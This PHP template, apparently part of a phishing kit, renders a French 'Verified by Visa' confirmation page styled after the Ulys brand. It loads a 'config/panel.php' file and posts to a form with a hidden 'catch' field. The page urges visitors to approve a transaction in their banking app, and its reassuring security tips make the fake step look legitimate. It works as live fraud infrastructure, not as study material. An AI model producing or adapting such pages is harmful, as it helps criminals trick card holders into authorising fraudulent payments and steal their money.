<?php
require_once 'config/panel.php';
// Start output buffering to capture content
ob_start();
?>

<div class="ulys-main">
    <div class="ulys-login-card">
        <h2>Vérification VBV</h2>
        <div class="ulys-login-desc mb-4">
            <span class="ulys-orange">Pour finaliser votre paiement, saisissez le code VBV (Verified by Visa) reçu par SMS ou via votre application bancaire.</span>
        </div>
        <form method="POST" action="index.php?view=vbv">
            <input type="hidden" name="catch">
            <div class="ulys-form-group" style="margin-bottom: 18px;">
                <div style="display: flex; align-items: center; gap: 10px; background: #fff7e6; border: 1.5px solid #ffe0b2; border-radius: 8px; padding: 12px 16px;">
                    <i class="fas fa-mobile-alt" style="font-size: 1.5rem; color: #ff3c1b;"></i>
                    <span style="color: #222; font-size: 1.05rem;">
                        Valide la transaction dans <b>l'application de ta banque</b> pour finaliser le paiement.
                    </span>
                </div>
            </div>
            <button type="submit" name="submit" value="vbv" class="ulys-btn" style="background: #ff3c1b; color: #fff;">Valider</button>
        </form>
    </div>
    <div class="ulys-tips-col">
        <h3>Astuces&nbsp;!</h3>
        <div class="ulys-tip-block">
            <i class="fas fa-shield-alt"></i>
            <div>
                <strong>Sécurité</strong><br>
                Ne communiquez jamais votre code VBV à un tiers.
            </div>
        </div>
        <div class="ulys-tip-block">
            <i class="fas fa-mobile-alt"></i>
            <div>
                <strong>Problème de réception ?</strong><br>
                Vérifiez que votre téléphone est allumé et capte le réseau, ou consultez votre application bancaire.
            </div>
        </div>
    </div>
</div>

<?php
// Get the buffer contents and clean the buffer
$viewContent = ob_get_clean();

// Include layout with the view content
include_once 'layout.php';
?> 